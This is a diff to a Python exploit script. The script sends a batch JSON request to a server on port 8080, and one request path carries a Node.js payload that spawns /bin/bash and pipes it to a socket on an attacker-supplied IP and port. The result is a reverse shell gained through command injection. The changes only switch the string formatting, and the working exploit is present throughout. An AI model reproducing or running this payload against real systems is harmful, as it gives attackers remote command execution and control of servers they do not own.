@@ -12,7 +12,7 @@ def inject(ip, attackerip, attackerport):
     :type cmd: string
     """
 
-    target = "http://%s:8080/batch" % sys.argv[1]
+    target = "http://{}:8080/batch".format(sys.argv[1]) 
     #cmd = "//bin//bash"
     cmd = "\\\\x2fbin\\\\x2fbash"
 
@@ -21,20 +21,20 @@ def inject(ip, attackerip, attackerport):
     #shell += "client.connect(%s, \"%s\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);" % (attackerport, attackerip)
     #shell += "sh.stderr.pipe(client);});"
 
-    shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd
+    shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'{}\'); '.format(cmd)
     shell += 'var client = new net.Socket(); '
-    shell += 'client.connect(%s, \'%s\', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)
+    shell += "client.connect({}, \'{}\', function() {{client.pipe(sh.stdin);sh.stdout.pipe(client);".format(attackerport, attackerip) 
     shell += 'sh.stderr.pipe(client);});'
     
     request_1 = '{"method":"get","path":"/profile"}' 
     request_2 = '{"method":"get","path":"/item"}' 
     #request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % (shell)
     #request_3 = '{"method":"get","path":"/item/$1.id"}'
-    request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell
-    print('request_3: {}'.format(request_3))
+    request_3 = '{{"method":"get","path":"/item/$1.id;{}"}}'.format(shell)
+    print('requests_3: {}'.format(request_3))
 
     
-    json = '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3) 
+    json = '{{"requests":[{},{},{}]}}'.format(request_1, request_2, request_3) 
     print('json: {}'.format(json))
     r = requests.post(target, json)
     
@@ -46,8 +46,8 @@ def main():
     """
     if len(sys.argv) != 4:
         #print "(+) usage: %s <target>" % sys.argv[0] 
-        print('len of sys.argv: %d' % len(sys.argv))
-        print("(+) usage: %s <target> <attackerip> <attackerport>" % sys.argv[0])
+        print('len of sys.argv: {}'.format(len(sys.argv)))
+        print("(+) usage: {} <target> <attackerip> <attackerport>".format(sys.argv[0]))
         sys.exit(-1)
 
     ip = sys.argv[1]
